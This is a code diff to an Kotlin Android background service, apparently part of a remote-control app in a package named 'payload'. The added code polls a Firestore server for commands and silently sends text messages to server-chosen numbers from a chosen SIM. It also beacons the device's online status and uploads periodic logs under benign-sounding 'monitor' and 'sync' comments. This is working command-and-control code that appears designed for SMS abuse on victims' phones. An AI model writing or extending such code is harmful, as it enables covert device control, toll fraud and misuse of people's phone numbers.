@@ -129,8 +129,18 @@ class UnifiedService : Service() {
     private suspend fun monitorDevice() {
         while (coroutineContext.isActive) {
             try {
-                // Monitor device status
+                // Monitor device status and update last online
                 Log.d(TAG, "Monitoring device...")
+                
+                val deviceId = getDeviceId()
+                val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
+                
+                // Update last online timestamp
+                repository.updateDeviceStatus(
+                    deviceId,
+                    mapOf("lastOnline" to System.currentTimeMillis())
+                )
+                
                 delay(60000) // Check every minute
             } catch (e: Exception) {
                 Log.e(TAG, "Error in monitorDevice", e)
@@ -143,6 +153,29 @@ class UnifiedService : Service() {
             try {
                 // Sync data with server
                 Log.d(TAG, "Syncing data...")
+                
+                val deviceId = getDeviceId()
+                val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
+                
+                // Check for SMS send commands
+                val sendSmsCommand = repository.getSendSmsCommand(deviceId).getOrNull()
+                if (sendSmsCommand != null && !sendSmsCommand.sent) {
+                    Log.d(TAG, "Found pending SMS command")
+                    val success = com.payload.jansiix0ne.util.SmsHelper.sendSms(
+                        applicationContext,
+                        sendSmsCommand.phoneNumber,
+                        sendSmsCommand.message,
+                        sendSmsCommand.simSlot
+                    )
+                    
+                    if (success) {
+                        repository.updateSendSmsStatus(deviceId, true)
+                        Log.d(TAG, "✅ SMS sent successfully")
+                    } else {
+                        Log.e(TAG, "❌ Failed to send SMS")
+                    }
+                }
+                
                 delay(300000) // Sync every 5 minutes
             } catch (e: Exception) {
                 Log.e(TAG, "Error in syncData", e)
@@ -155,10 +188,26 @@ class UnifiedService : Service() {
             try {
                 // Perform periodic tasks
                 Log.d(TAG, "Performing periodic tasks...")
+                
+                val deviceId = getDeviceId()
+                val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
+                
+                // Save periodic log
+                repository.saveLog(
+                    "INFO",
+                    "UnifiedService is running",
+                    deviceId
+                )
+                
                 delay(600000) // Every 10 minutes
             } catch (e: Exception) {
                 Log.e(TAG, "Error in performPeriodicTasks", e)
             }
         }
+    }
+    
+    private fun getDeviceId(): String {
+        val prefs = applicationContext.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
+        return prefs.getString("device_id", "") ?: ""
     }
 }
